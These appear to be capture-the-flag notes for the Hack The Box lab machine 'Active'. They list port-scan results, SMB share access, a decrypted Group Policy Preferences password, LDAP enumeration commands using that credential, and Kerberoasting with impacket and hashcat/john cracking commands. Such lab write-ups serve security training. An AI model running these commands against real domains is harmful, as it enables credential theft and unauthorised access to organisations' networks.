# Active

### Reconnaissance

- 53/tcp domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
- 88/tcp kerberos sec  Microsoft Windows Kerberos (server time: 2023-08-08 15:00:19Z)
- 135/tcp msrpc Microsoft Windows RPC
- 139/tcp netbios ssn   Microsoft Windows netbios-ssn
- 389/tcp ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site Name)
- 445/tcp microsoft-ds?
- 464/tcp  kpasswd5?
- 593/tcp ncacn_http Microsoft Windows RPC over HTTP 1.0
- 636/tcp tcpwrapped 
- 3268/tcp ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site Name)
- 3269/tcp tcpwrapped 
- 5722/tcp msrpc Microsoft Windows RPC
- 9389/tcp mc-nmf .NET Message Framing
- 47001/tcp http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
- 49152/tcp msrpc Microsoft Windows RPC
- 49153/tcp msrpc Microsoft Windows RPC
- 49154/tcp msrpc Microsoft Windows RPC
- 49155/tcp msrpc Microsoft Windows RPC
- 49157/tcp ncacn_http Microsoft Windows RPC over HTTP 1.0
- 49158/tcp msrpc Microsoft Windows RPC
- 49165/tcp msrpc Microsoft Windows RPC
- 49168/tcp msrpc Microsoft Windows RPC
- 49169/tcp msrpc Microsoft Windows RPC

Results `smbclient -L ////10.10.10.100`

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Replication     Disk      
SYSVOL          Disk      Logon server share 
Users           Disk     
```

Replication can be accessed without credentials and downloaded

`smbget -R smb://active.htb/Replication` 

Groups.xml file in the share contains creds with a password crackable by `gpp-decrypt`

Connect to Users share

`smbclient -W active.htb -U SVC_TGS //active.htb`

The user.txt is on the SVC_TGS user's Desktop

Enumerate accounts on the target through LDAP

`ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName`

Base ldapsearch command returns the AD UserAccountControl attributes of accounts

`ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18`

-s sub filter

`-s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))"`

Thiss allows filtering of the returned accounts. Here we only want objects of the person category, user Class,
and those [that aren't disabled](https://learn.microsoft.com/en-GB/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)

Impacket's GetADUsers simplifies the user enumeration process

`impacket-GetADUsers -all active/svc_tgs -dc-ip 10.10.10.100`

### Exploitation

Kerberoasting

ldapsearch to get the SPN's of active user accounts

`ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep servicePrincipalName -B 1`

Impacket's GetUserSPNs can also request the TGS for the attack

`impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request`

Crack the hash with john or hashcat

`hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt`

`john --format:krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
